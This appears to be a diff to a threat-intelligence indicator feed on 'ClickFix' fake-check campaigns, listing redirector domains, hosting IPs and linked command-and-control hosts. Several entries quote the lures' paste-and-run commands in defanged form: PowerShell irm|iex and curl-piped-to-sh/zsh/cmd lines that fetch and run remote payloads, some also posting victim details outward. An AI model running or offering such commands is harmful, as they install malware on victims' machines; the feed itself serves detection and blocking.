@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5053,
+ "count": 5054,
  "indicators": [
   {
    "indicator": "1.15.58.123",
@@ -2128,7 +2128,9 @@
     "ncheck-brows.beer",
     "codes.browse-cdn.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "browse-nnccodes.beer"
+   ]
   },
   {
    "indicator": "185.187.169.164",
@@ -4428,7 +4430,9 @@
     "ncheck-brows.beer",
     "codes.browse-cdn.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "browse-nnccodes.beer"
+   ]
   },
   {
    "indicator": "38.54.15.83",
@@ -12396,7 +12400,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "104.21.24.186",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -12409,14 +12413,14 @@
      "last_seen": "2026-11-11"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "2606:4700:3032::ac43:dbe7",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-11",
      "last_seen": "2026-11-11"
     },
     {
-     "ip": "2606:4700:3032::ac43:dbe7",
+     "ip": "2606:4700:3034::6815:18ba",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-11",
@@ -12434,6 +12438,13 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-10-20",
+     "last_seen": "2026-11-11"
+    },
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-11",
      "last_seen": "2026-11-11"
     }
    ],
@@ -13635,6 +13646,70 @@
    "lure_from": [
     "codes.caffe-img.com",
     "codes.browse-cdn.beer"
+   ]
+  },
+  {
+   "indicator": "afrobloggers.org",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Redirector",
+   "status": "online",
+   "first_seen": "2026-10-31",
+   "last_seen": "2026-11-06",
+   "last_online": "2026-11-11",
+   "offline_since": null,
+   "url": "https://afrobloggers.org/",
+   "brand": null,
+   "product": null,
+   "hosting": "Cloudflare (proxied)",
+   "dns": "Cloudflare",
+   "ip": "2606:4700:3030::6815:64d",
+   "asn": "AS13335",
+   "org": "Cloudflare, Inc.",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "2606:4700:3030::6815:64d",
+     "asn": "AS13335",
+     "org": "Cloudflare, Inc.",
+     "first_seen": "2026-11-05",
+     "last_seen": "2026-11-06"
+    },
+    {
+     "ip": "2606:4700:3032::ac43:869c",
+     "asn": "AS13335",
+     "org": "Cloudflare, Inc.",
+     "first_seen": "2026-10-31",
+     "last_seen": "2026-11-01"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "afrobloggers.org",
+     "status": "online",
+     "first_seen": "2026-10-31",
+     "last_seen": "2026-11-06"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
+    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+   ],
+   "connects_to": [
+    "hagosuro.lc",
+    "xorados.com",
+    "trek-72.com",
+    "t-trustrest.com",
+    "nexguard.pro",
+    "trustchecknes.com"
+   ],
+   "lure_from": [
+    "interseq.at"
    ]
   },
   {
@@ -19211,12 +19286,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "iex(irm 'hxxps[:]//cosmical2049[.]com/crabs/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})"
+    "iex(irm 'hxxps[:]//cosmical2049[.]com/crabs/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
+    "(irm 'hxxps[:]//nexguard[.]pro/danteproliv1/[id]')|iex",
+    "(irm 'hxxps[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
    ],
    "connects_to": [
-    "hagosuro.lc",
-    "cosmical2049.com"
+    "cosmical2049.com",
+    "nexguard.pro",
+    "hagosuro.lc"
    ],
    "lure_from": [
     "interseq.at"
@@ -31112,7 +31189,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-20",
-   "last_seen": "2026-10-21",
+   "last_seen": "2026-11-11",
    "last_online": "2026-11-11",
    "offline_since": null,
    "url": "https://autosos.biz/",
@@ -31130,7 +31207,7 @@
      "asn": "AS56851",
      "org": "VPS-UA-AS PE Skurykhin Mukola Volodumurovuch, UA",
      "first_seen": "2026-10-20",
-     "last_seen": "2026-10-21"
+     "last_seen": "2026-11-11"
     }
    ],
    "hosts": [
@@ -31138,7 +31215,7 @@
      "host": "autosos.biz",
      "status": "online",
      "first_seen": "2026-10-20",
-     "last_seen": "2026-10-21"
+     "last_seen": "2026-11-11"
     }
    ],
    "actor": null,
@@ -32737,7 +32814,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-25",
-   "last_seen": "2026-10-25",
+   "last_seen": "2026-11-11",
    "last_online": "2026-11-11",
    "offline_since": null,
    "url": "https://bajmol.com/",
@@ -32747,7 +32824,7 @@
    "dns": "AWS Route 53",
    "ip": "52.220.157.114",
    "asn": "AS16509",
-   "org": "Amazon.com, Inc.",
+   "org": "AMAZON-02 - Amazon.com, Inc., US",
    "country": "SG",
    "ips": [
     {
@@ -32755,7 +32832,7 @@
      "asn": "AS16509",
      "org": "Amazon.com, Inc.",
      "first_seen": "2026-10-25",
-     "last_seen": "2026-10-25"
+     "last_seen": "2026-11-11"
     }
    ],
    "hosts": [
@@ -32763,7 +32840,7 @@
      "host": "bajmol.com",
      "status": "online",
      "first_seen": "2026-10-25",
-     "last_seen": "2026-10-25"
+     "last_seen": "2026-11-11"
     }
    ],
    "actor": null,
@@ -32790,7 +32867,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-20",
-   "last_seen": "2026-10-21",
+   "last_seen": "2026-11-11",
    "last_online": "2026-11-11",
    "offline_since": null,
    "url": "https://balajibuilders.net/",
@@ -32808,7 +32885,7 @@
      "asn": "AS394695",
      "org": "PUBLIC-DOMAIN-REGISTRY - PDR, US",
      "first_seen": "2026-10-20",
-     "last_seen": "2026-10-21"
+     "last_seen": "2026-11-11"
     }
    ],
    "hosts": [
@@ -32816,7 +32893,7 @@
      "host": "balajibuilders.net",
      "status": "online",
      "first_seen": "2026-10-20",
-     "last_seen": "2026-10-21"
+     "last_seen": "2026-11-11"
     }
    ],
    "actor": null,
@@ -33636,7 +33713,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-28",
-   "last_seen": "2026-10-28",
+   "last_seen": "2026-11-11",
    "last_online": "2026-11-11",
    "offline_since": null,
    "url": "https://barcasavictor.es/",
@@ -33654,7 +33731,7 @@
      "asn": "AS8560",
      "org": "IONOS-AS IONOS SE, DE",
      "first_seen": "2026-10-28",
-     "last_seen": "2026-10-28"
+     "last_seen": "2026-11-11"
     }
    ],
    "hosts": [
@@ -33662,7 +33739,7 @@
      "host": "barcasavictor.es",
      "status": "online",
      "first_seen": "2026-10-28",
-     "last_seen": "2026-10-28"
+     "last_seen": "2026-11-11"
     }
    ],
    "actor": null,
@@ -34339,7 +34416,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-19",
-   "last_seen": "2026-10-20",
+   "last_seen": "2026-11-11",
    "last_online": "2026-11-11",
    "offline_since": null,
    "url": "https://bateriasmaksul.com.br/",
@@ -34347,11 +34424,18 @@
    "product": null,
    "hosting": "- LWSA S/A",
    "dns": "tsweb.uni5.net",
-   "ip": "191.6.210.190",
+   "ip": "2804:10:8002::210:190",
    "asn": "AS28299",
    "org": "AS28299 - LWSA S/A, BR",
    "country": "BR",
    "ips": [
+    {
+     "ip": "2804:10:8002::210:190",
+     "asn": "AS28299",
+     "org": "AS28299 - LWSA S/A, BR",
+     "first_seen": "2026-11-11",
+     "last_seen": "2026-11-11"
+    },
     {
      "ip": "191.6.210.190",
      "asn": "AS28299",
@@ -34365,7 +34449,7 @@
      "host": "bateriasmaksul.com.br",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-10-20"
+     "last_seen": "2026-11-11"
     }
    ],
    "actor": null,
@@ -39807,7 +39891,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-21",
-   "last_seen": "2026-10-22",
+   "last_seen": "2026-11-11",
    "last_online": "2026-11-11",
    "offline_since": null,
    "url": "https://bhagja.co.id/",
@@ -39825,7 +39909,7 @@
      "asn": "AS131749",
      "org": "MEDIAINDOCYBER-AS-ID - PT. Arthatama Adhiprima Persada, ID",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
+     "last_seen": "2026-11-11"
     }
    ],
    "hosts": [
@@ -39833,7 +39917,7 @@
      "host": "bhagja.co.id",
      "status": "online",
      "first_seen": "2026-10-21",
-     "last_seen": "2026-10-22"
+     "last_seen": "2026-11-11"
     }
    ],
    "actor": null,
@@ -43071,8 +43155,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=42790230-9a0c-4aa0-90b9-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fdev.wordpress.blackbirdtech.app%2F&os=Mac%2015&lastVisitAt=2026-11-08T18%3A15%3A52.202Z&lastShellAt=2026-11-08T18%3A15%3A52.202Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=c8fea06f-c78b-4eb2-9976-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fdev.wordpress.blackbirdtech.app%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-08T18%3A12%3A42.160Z\"\" -d \"\"lastShellAt=2026-11-08T18%3A12%3A42.160Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=cc060928-9cf5-44eb-a6b5-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fdev.wordpress.blackbirdtech.app%2F&os=Mac%2015&lastVisitAt=2026-11-12T00%3A01%3A21.142Z&lastShellAt=2026-11-12T00%3A01%3A21.142Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=73a64a10-722d-4795-910f-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fdev.wordpress.blackbirdtech.app%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-11T23%3A53%3A37.690Z\"\" -d \"\"lastShellAt=2026-11-11T23%3A53%3A37.690Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info",
@@ -43080,7 +43164,8 @@
    ],
    "lure_from": [
     "ncheck-brows.beer",
-    "codes.browse-cdn.beer"
+    "codes.browse-cdn.beer",
+    "browse-nnccodes.beer"
    ]
   },
   {
@@ -43500,9 +43585,12 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL 'scp9k7km[.]corep[.]store/?ublib=73f0f284-7ad1-4ec9-8248-[id]')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282",
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/608-B8D3-712Fc1654E/849-b650-BC87849C3/B8-81-73-B6-DE-F4 | IEX"
    ],
-   "connects_to": [],
+   "connects_to": [
+    "scp9k7km.corep.store"
+   ],
    "lure_from": []
   },
   {
@@ -63803,7 +63891,7 @@
    "product": null,
    "hosting": "Namecheap",
    "dns": "Namecheap",
-   "ip": "63.250.43.132",
+   "ip": "63.250.43.133",
    "asn": "AS22612",
    "org": "NAMECHEAP-NET - Namecheap, Inc., US",
    "country": "US",
@@ -69152,7 +69240,9 @@
     "ncheck-brows.beer",
     "codes.browse-cdn.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "browse-nnccodes.beer"
+   ]
   },
   {
    "indicator": "ctctrailer.com",
@@ -78456,7 +78546,8 @@
     "id-dns.net",
     "t-trustrest.com",
     "xorados.com",
-    "groverudder12.com"
+    "groverudder12.com",
+    "nexguard.pro"
    ],
    "lure_from": [
     "interseq.at"
@@ -135078,7 +135169,9 @@
     "ncheck-brows.beer",
     "codes.browse-cdn.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "browse-nnccodes.beer"
+   ]
   },
   {
    "indicator": "januarioadvocacia.com.br",
@@ -156475,10 +156568,10 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "btorsercoyt31.cc",
     "fudcomcheck.art",
-    "govrobczxc.cc",
-    "fcdnbovres.cc"
+    "btorsercoyt31.cc",
+    "fcdnbovres.cc",
+    "govrobczxc.cc"
    ]
   },
   {
@@ -159126,11 +159219,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -184258,13 +184352,15 @@
     "trek-72.com",
     "groverudder12.com",
     "jscdncloude.beer",
+    "nexguard.pro",
     "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at",
-    "id-verfied.boats"
+    "id-verfied.boats",
+    "browse-nnccodes.beer"
    ]
   },
   {
@@ -227776,11 +227872,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -228534,11 +228631,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -232980,11 +233078,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -233173,11 +233272,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -236852,11 +236952,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -237824,11 +237925,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -238851,11 +238953,12 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//nexguard[.]pro/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "nexguard.pro",
     "t-trustresnew.com",
     "trustchecknes.com"
    ],
@@ -247985,7 +248088,9 @@
     "ncheck-brows.beer",
     "codes.browse-cdn.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "browse-nnccodes.beer"
+   ]
   },
   {
    "indicator": "truearttattoos.com",
@@ -254910,7 +255015,8 @@
     "hagosuro.lc",
     "t-trustrest.com",
     "xorados.com",
-    "groverudder12.com"
+    "groverudder12.com",
+    "nexguard.pro"
    ],
    "lure_from": [
     "interseq.at"
